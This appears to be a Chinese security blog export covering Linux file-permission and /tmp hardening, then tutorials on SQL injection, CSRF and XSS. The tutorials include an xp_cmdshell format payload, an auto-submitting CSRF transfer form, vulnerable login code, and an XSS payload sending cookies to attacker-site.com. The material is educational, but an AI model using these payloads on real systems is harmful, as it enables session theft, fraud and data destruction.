&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对重要的文件进行加锁，虽然能够提高服务器的安全性，但是也会带来一些不便，例如，在软件的安装、升级时可能需要去掉有关目录和文件的immutable属性和append-only属性，同时，对日志文件设置了append-only属性，可能会使日志轮换(logrotate)无法进行。因此，在使用chattr命令前，需要结合服务器的应用环境来权衡是否需要设置immutable属性和append-only属性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，虽然通过chattr命令修改文件属性能够提高文件系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var等目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根目录不能有不可修改属性，因为如果根目录具有不可修改属性，那么系统根本无法工作：/dev在启动时，syslog需要删除并重新建立/dev/log套接字设备，如果设置了不可修改属性，那么可能出问题；/tmp目录会有很多应用程序和系统程序需要在这个目录下建立临时文件，也不能设置不可修改属性；/var是系统和程序的日志目录，如果设置为不可修改属性，那么系统写日志将无法进行，所以也不能通过chattr命令保护。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虽然通过chattr命令无法保护/dev、/tmp等目录的安全性，但是有另外的方法可以实现，在面将做详细介绍。 二、文件权限检查和修改&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不正确的权限设置直接威胁着系统的安全，因此运维人员应该能及时发现这些不正确的权限设置，并立刻修正，防患于未然。下面列举几种查找系统不安全权限的方法。 查找系统中任何用户都有写权限的文件或目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找文件： 1find / -type f -perm -2 -o -perm -20 |xargs ls -al &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找目录： 1find / -type d -perm -2 -o -perm -20 |xargs ls –ld 查找系统中所有含“s”位的程序 1find / -type f -perm -4000 -o -perm -2000 -print | xargs ls –al &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;含有“s”位权限的程序对系统安全威胁很大，通过查找系统中所有具有“s”位权限的程序，可以把某些不必要的“s”位程序去掉，这样可以防止用户滥用权限或提升权限的可能性。 检查系统中所有suid及sgid文件 12find / -user root -perm -2000 -print -exec md5sum &#123;&#125; \;find / -user root -perm -4000 -print -exec md5sum &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将检查的结果保存到文件中，可在以后的系统检查中作为参考。 检查系统中没有属主的文件 1find / -nouser -o –nogroup &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;没有属主的孤儿文件比较危险，往往成为黑客利用的工具，因此找到这些文件后，要么删除掉，要么修改文件的属主，使其处于安全状态。 三、/tmp、/var/tmp、/dev/shm安全设定&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux系统中，主要有两个目录或分区用来存放临时文件，分别是/tmp和/var/tmp。存储临时文件的目录或分区有个共同点就是所有用户可读写、可执行，这就为系统留下了安全隐患。攻击者可以将病毒或者木马脚本放到临时文件的目录下进行信息收集或伪装，严重影响服务器的安全，此时，如果修改临时目录的读写执行权限，还有可能影响系统上应用程序的正常运行，因此，如果要兼顾两者，就需要对这两个目录或分区就行特殊的设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/dev/shm是Linux下的一个共享内存设备，在Linux启动的时候系统默认会加载/dev/shm，被加载的/dev/shm使用的是tmpfs文件系统，而tmpfs是一个内存文件系统，存储到tmpfs文件系统的数据会完全驻留在RAM中，这样通过/dev/shm就可以直接操控系统内存，这将非常危险，因此如何保证/dev/shm安全也至关重要。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于/tmp的安全设置，需要看/tmp是一个独立磁盘分区，还是一个根分区下的文件夹，如果/tmp是一个独立的磁盘分区，那么设置非常简单，修改/etc/fstab文件中/tmp分区对应的挂载属性，加上nosuid、noexec、nodev三个选项即可，修改后的/tmp分区挂载属性类似如下： 1LABEL=/tmp /tmp ext3 rw,nosuid,noexec,nodev 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，nosuid、noexec、nodev选项，表示不允许任何suid程序，并且在这个分区不能执行任何脚本等程序，并且不存在设备文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在挂载属性设置完成后，重新挂载/tmp分区，保证设置生效。对于/var/tmp，如果是独立分区，安装/tmp的设置方法是修改/etc/fstab文件即可；如果是/var分区下的一个目录，那么可以将/var/tmp目录下所有数据移动到/tmp分区下，然后在/var下做一个指向/tmp的软连接即可。也就是执行如下操作： 12[root@server ~]# mv /var/tmp/* /tmp[root@server ~]# ln -s /tmp /var/tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果/tmp是根目录下的一个目录，那么设置稍微复杂，可以通过创建一个loopback文件系统来利用Linux内核的loopback特性将文件系统挂载到/tmp下，然后在挂载时指定限制加载选项即可。一个简单的操作示例如下： 1234567[root@server ~]# dd if=/dev/zero of=/dev/tmpfs bs=1M count=10000[root@server ~]# mke2fs -j /dev/tmpfs[root@server ~]# cp -av /tmp /tmp.old[root@server ~]# mount -o loop,noexec,nosuid,rw /dev/tmpfs /tmp[root@server ~]# chmod 1777 /tmp[root@server ~]# mv -f /tmp.old/* /tmp/[root@server ~]# rm -rf /tmp.old &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，编辑/etc/fstab，添加如下内容，以便系统在启动时自动加载loopback文件系统： 1/dev/tmpfs /tmp ext3 loop,nosuid,noexec,rw 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了验证一下挂载时指定限制加载选项是否生效，可以在/tmp分区创建一个shell文件，操作如下： 123456[root@tc193 tmp]# ls -al|grep shell-rwxr-xr-x 1 root root 22 Oct 6 14:58 shell-test.sh[root@server ~]# pwd/tmp[root@tc193 tmp]# ./shell-test.sh-bash: ./shell-test.sh: Permission denied &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看出，虽然文件有可执行属性，但是已经在/tmp分区无法执行任何文件了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，再来修改一下/dev/shm的安全设置。由于/dev/shm是一个共享内存设备，因此也可以通过修改/etc/fstab文件设置而实现，在默认情况下，/dev/shm通过defaults选项来加载，对保证其安全性是不够 的，修改/dev/shm的挂载属性，操作如下： 1tmpfs /dev/shm tmpfs defaults,nosuid,noexec,rw 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过这种方式，就限制了任何suid程序，同时也限制了/dev/shm的可执行权限，系统安全性得到进一步提升。]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[防止SQL注入]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F12.%20%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[防止SQL注入&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个恐怖的例子： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注入式攻击的详细解释SQL下面我们将以一个简单的用户登陆为例，结合代码详细解释一下SQL注入式攻击，与及他的防范措施。对于一个简单的用户登陆可能的代码如下： 123456789101112131415try&#123; string strUserName = this.txtUserName.Text; string strPwd = this.txtPwd.Text; string strSql = "select * from userinfo where UserName='" + strUserName + "' and Password='" + strPwd + "'"; SqlConnection objDbConn = new SqlConnection("数据库连接字符串"); SqlDataAdapter objAdapter = new SqlDataAdapter(strSql,objDbConn); DataSet objDataSet = null; objAdapter.Fill(objDataSet);//TODO 对获取的数据进行判断。&#125;catch (System.Exception e)&#123; this.lblMsg.Text = e.Message; this.lblMsg.Visible = true;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面这段代码中，如果用户的输入是正常的用户名和密码的话，那么执行都会比较正常，但是，假如输入用户名的时候，输入的是“johny’–”的话，在 SQLServer里面执行的语句将会是“select * from userinfo where UserName=’johny’–‘ and Password=’密码’”，只要数据库中存在johny这个用户的话，那么不管密码是什么，语句都能够执行成功，并且能够顺利通过登陆。还 有更加厉害的，我们知道SQLServer里面有一些系统的存储过程，能够执行操作系统的很多命令，比如xp_cmdshell，假如上面用户登陆的时 候，用户名部分输入的是“johny’ exec xp_cmdshell ‘format d:/s’–”，大家想想一下后果是什么？有恶意的用户，只要把’format d:/s’这个命令稍加改造就能够做很多不合法的事情。 .NET防SQL注入方法1.利用SqlCommand传参数的方法：1234string strSQL="SELECT * FROM [user] WHERE user_id=@id";SqlCommand cmd = new SqlCommand();cmd.CommandText = strSQL;cmd.Parameters.Add("@id",SqlDbType.VarChar,20).Value=Request["id"].ToString(); 2.过滤禁止运行法：1234567891011121314151617181920/// &lt;summary&gt;/// 过滤SQL语句,防止注入/// &lt;/summary&gt;/// &lt;param name="strSql"&gt;&lt;/param&gt;/// &lt;returns&gt;0 - 没有注入, 1 - 有注入 &lt;/returns&gt;public int filterSql(string sSql)&#123; int srcLen, decLen = 0; sSql = sSql.ToLower().Trim(); srcLen = sSql.Length; sSql = sSql.Replace("exec", ""); sSql = sSql.Replace("delete", ""); sSql = sSql.Replace("master", ""); sSql = sSql.Replace("truncate", ""); sSql = sSql.Replace("declare", ""); sSql = sSql.Replace("create", ""); sSql = sSql.Replace("xp_", "no"); decLen = sSql.Length; if (srcLen == decLen) return 0; else return 1; &#125; 3.存储过程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;js版的防范SQL注入式攻击代码： 1234567891011&lt;script language="javascript"&gt;&lt;!--var url = location.search;var re=/^\?(.*)(select%20|insert%20|delete%20from%20|count\(|drop%20table|update%20truncate%20|asc\(|mid\(|char\(|xp_cmdshell|exec%20master|net%20localgroup%20administrators|\"|:|net%20user|\|%20or%20)(.*)$/gi;var e = re.test(url);if(e) &#123; alert("地址中含有非法字符～"); location.href="error.asp";&#125;//--&gt;&lt;script&gt;]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈CSRF攻击方式]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F13.%20%E6%B5%85%E8%B0%88CSRF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[浅谈CSRF攻击方式一.CSRF是什么？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。 二.CSRF可以做什么？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 三.CSRF漏洞现状&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。 四.CSRF的原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下图简单阐述了CSRF攻击的思想： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤： 登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生： 你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。 你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……） 上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:&gt;） 示例1：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;银行网站A，它以GET请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;危险网站B，它里面有一段HTML的代码如下： 1&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块…… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作…… 示例2：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了杜绝上面的问题，银行决定改用POST请求完成转账操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;银行网站A的WEB表单如下： 12345&lt;form action="Transfer.php" method="POST"&gt; &lt;p&gt;ToBankId: &lt;input type="text" name="toBankId" /&gt;&lt;/p&gt; &lt;p&gt;Money: &lt;input type="text" name="money" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit" value="Transfer" /&gt;&lt;/p&gt;&lt;/form&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台处理页面Transfer.php如下： 1234567&lt;?php session_start(); if (isset($_REQUEST['toBankId'] &amp;&amp; isset($_REQUEST['money'])) &#123; buy_stocks($_REQUEST['toBankId'], $_REQUEST['money']); &#125;?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;危险网站B，仍然只是包含那句HTML代码： 1&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果…..和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。 示例3：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下： 1234567&lt;?php session_start(); if (isset($_POST['toBankId'] &amp;&amp; isset($_POST['money'])) &#123; buy_stocks($_POST['toBankId'], $_POST['money']); &#125;?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而，危险网站B与时俱进，它改了一下代码： 1234567891011121314151617181920&lt;html&gt; &lt;head&gt; &lt;script type="text/javascript"&gt; function steal() &#123; iframe = document.frames["steal"]; iframe.document.Submit("transfer"); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload="steal()"&gt; &lt;iframe name="steal" display="none"&gt; &lt;form method="POST" name="transfer" action="http://www.myBank.com/Transfer.php"&gt; &lt;input type="hidden" name="toBankId" value="11"&gt; &lt;input type="hidden" name="money" value="1000"&gt; &lt;/form&gt; &lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块……因为这里危险网站B暗地里发送了POST请求到银行! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;理解上面的3种攻击模式，其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！ 五.CSRF的防御&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结了一下看到的资料，CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。 1.服务端进行CSRF防御&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。 Cookie Hashing(所有表单都包含同一个伪随机值)：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了:&gt; 12345&lt;?php //构造加密的Cookie信息 $value = “DefenseSCRF”; setcookie(”cookie”, $value, time()+3600);?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在表单里增加Hash值，以认证这确实是用户发送的请求。 123456789&lt;?php $hash = md5($_COOKIE['cookie']);?&gt;&lt;form method=”POST” action=”transfer.php”&gt; &lt;input type=”text” name=”toBankId”&gt; &lt;input type=”text” name=”money”&gt; &lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt; &lt;input type=”submit” name=”submit” value=”Submit”&gt;&lt;/form&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在服务器端进行Hash值验证 123456789101112&lt;?php if(isset($_POST['check'])) &#123; $hash = md5($_COOKIE['cookie']); if($_POST['check'] == $hash) &#123; doJob(); &#125; else &#123; //... &#125; &#125; else &#123; //... &#125;?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢….由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了，某些除外，所以如果需要100%的杜绝，这个不是最好的方法。 验证码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，厄….这个方案可以完全解决CSRF，但个人觉得在易用性方面似乎不是太好，还有听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。 One-Time Tokens(不同的表单包含一个不同的伪随机值)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在实现One-Time Tokens时，需要注意一点：就是“并行会话的兼容”。如果用户在一个站点上同时打开了两个不同的表单，CSRF保护措施不应该影响到他对任何表单的提交。考虑一下如果每次表单被装入时站点生成一个伪随机值来覆盖以前的伪随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的伪随机值。必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。 以下我的实现:1.先是令牌生成函数(gen_token())：1234567&lt;?php function gen_token() &#123; //这里我是贪方便，实际上单使用Rand()得出的随机数作为令牌，也是不安全的。 //这个可以参考我写的Findbugs笔记中的《Random object created and used only once》 $token = md5(uniqid(rand(), true)); return $token;&#125; 2.然后是Session令牌生成函数(gen_stoken())：123456789101112&lt;?php function gen_stoken() &#123; $pToken = ""; if($_SESSION[STOKEN_NAME] == $pToken)&#123; //没有值，赋新值 $_SESSION[STOKEN_NAME] = gen_token(); &#125; else&#123; //继续使用旧的值 &#125; &#125;?&gt; 3.WEB表单生成隐藏输入域的函数： 1234567&lt;?php function gen_input() &#123; gen_stoken(); echo “&lt;input type=\”hidden\” name=\”" . FTOKEN_NAME . “\” value=\”" . $_SESSION[STOKEN_NAME] . “\”&gt; “; &#125;?&gt; 4.WEB表单结构：12345678910&lt;?php session_start(); include(”functions.php”);?&gt;&lt;form method=”POST” action=”transfer.php”&gt; &lt;input type=”text” name=”toBankId”&gt; &lt;input type=”text” name=”money”&gt; &lt;? gen_input(); ?&gt; &lt;input type=”submit” name=”submit” value=”Submit”&gt;&lt;/FORM&gt; 5.服务端核对令牌：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个很简单，这里就不再啰嗦了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这个其实不完全符合“并行会话的兼容”的规则，大家可以在此基础上修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实还有很多想写，无奈精力有限，暂且打住，日后补充，如果错漏，请指出:&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS：今天下午写这篇文档的时候FF崩溃了一次，写了一半文章的全没了，郁闷好久T_T……. 六.参考文献 Preventing CSRF Security Corner: Cross-Site Request Forgeries 《深入解析跨站请求伪造漏洞：原理剖析》 《Web安全测试之跨站请求伪造（CSRF）》 《深入解析跨站请求伪造漏洞：实例讲解》 CSRF]]></content>
      <tags>
        <tag>Linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss攻击入门]]></title>
    <url>%2F2017%2F08%2F17%2FLinux%E5%AE%89%E5%85%A8%2F11.%20xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[xss攻击入门&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xss攻击可以分成两种类型： 非持久型攻击 持久型攻击 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面我们通过具体例子，了解两种类型xss攻击。 1.非持久型xss攻击&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设有以下index.php页面： 12345&lt;?php$name = $_GET['name'];echo "Welcome $name&lt;br&gt;";echo "&lt;a href="http://www.cnblogs.com/bangerlee/"&gt;Click to Download&lt;/a&gt;";?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该页面显示两行信息： 从URI获取 ‘name’ 参数，并在页面显示 显示跳转到一条URL的链接 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时，当攻击者给出以下URL链接： 1index.php?name=guest&lt;script&gt;alert('attacked')&lt;/script&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户点击该链接时，将产生以下html代码，带’attacked’的告警提示框弹出： 1234Welcome guest&lt;script&gt;alert('attacked')&lt;/script&gt;&lt;br&gt;&lt;a href='http://www.cnblogs.com/bangerlee/'&gt;Click to Download&lt;/a&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的： 12345index.php?name=&lt;script&gt;window.onload = function() &#123;var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";&#125;&lt;/script&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下： 1234567Welcome &lt;script&gt;window.onload = function() &#123;var link=document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";&#125;&lt;/script&gt;&lt;br&gt;&lt;a href='http://www.cnblogs.com/bangerlee/'&gt;Click to Download&lt;/a&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户再点击 “Click to Download” 时，将跳转至攻击者提供的链接。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更： 1index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e 2.持久型xss攻击&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。 session背景知识&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session ID作为会话标识，游览器后续的请求均基于该session ID。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现有以下login.php，其根据 user_name 在数据中查找相应的 pass_word，然后将用户提供的 password 与查数据库所得的 pass_word 进行比较，如果验证成功则创建对应于 user_name 的 session。 123456789101112131415161718192021222324252627282930313233343536&lt;?php$Host= '192.168.1.8';$Dbname= 'app';$User= 'yyy';$Password= 'xxx';$Schema = 'test';$Conection_string="host=$Host dbname=$Dbname user=$User password=$Password";/* Connect with database asking for a new connection*/$Connect=pg_connect($Conection_string,$PGSQL_CONNECT_FORCE_NEW);/* Error checking the connection string */if (!$Connect) &#123; echo "Database Connection Failure"; exit;&#125;$query="SELECT user_name,password from $Schema.members where user_name='".$_POST['user_name']."';";$result=pg_query($Connect,$query);$row=pg_fetch_array($result,NULL,PGSQL_ASSOC);$user_pass = md5($_POST['pass_word']);$user_name = $row['user_name'];if(strcmp($user_pass,$row['password'])!=0) &#123; echo "Login failed";&#125;else &#123; # Start the session session_start(); $_SESSION['USER_NAME'] = $user_name; echo "&lt;head&gt; &lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\" &gt; &lt;/head&gt;";&#125;?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另有以下home.php，其根据登入的用户是 admin 还是其他用户，显示不同内容，对于admin，其列出所有用户，对于其他用户，提供包含输入框的form，可在数据库中插入新的用户名信息。 123456789101112131415161718192021222324252627282930313233343536&lt;?phpsession_start();if(!$_SESSION['USER_NAME']) &#123; echo "Need to login";&#125;else &#123; $Host= '192.168.1.8'; $Dbname= 'app'; $User= 'yyy'; $Password= 'xxx'; $Schema = 'test'; $Conection_string="host=$Host dbname=$Dbname user=$User password=$Password"; $Connect=pg_connect($Conection_string,$PGSQL_CONNECT_FORCE_NEW); if($_SERVER['REQUEST_METHOD'] == "POST") &#123; $query="update $Schema.members set display_name='".$_POST['disp_name']."' where user_name='".$_SESSION['USER_NAME']."';"; pg_query($Connect,$query); echo "Update Success"; &#125; else &#123; if(strcmp($_SESSION['USER_NAME'],'admin')==0) &#123; echo "Welcome admin&lt;br&gt;&lt;hr&gt;"; echo "List of user's are&lt;br&gt;"; $query = "select display_name from $Schema.members where user_name!='admin'"; $res = pg_query($Connect,$query); while($row=pg_fetch_array($res,NULL,PGSQL_ASSOC)) &#123; echo "$row[display_name]&lt;br&gt;"; &#125; &#125; else &#123; echo "&lt;form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\"&gt;"; echo "Update display name:&lt;input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\"&gt;"; echo "&lt;input type=\"submit\" value=\"Update\"&gt;"; &#125;&#125;&#125;?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意以上场景中，对 admin 和其他用户进行了不同的权限设置，admin可以看到所有用户列表，下面我们来看如何获取 admin 的session ID，从而使得其他用户也能获得 admin 的权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据： 1&lt;a href=# onclick=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\"&gt;bangerlee&lt;/a&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者提交了条带标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含 “bangerlee” 的用户列表将显示，如果 admin 用户点击 “bangerlee” 时，在 “attacker-site.com” 所在的服务器上，攻击者就可以窃取到 admin 的session-id： 1xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3 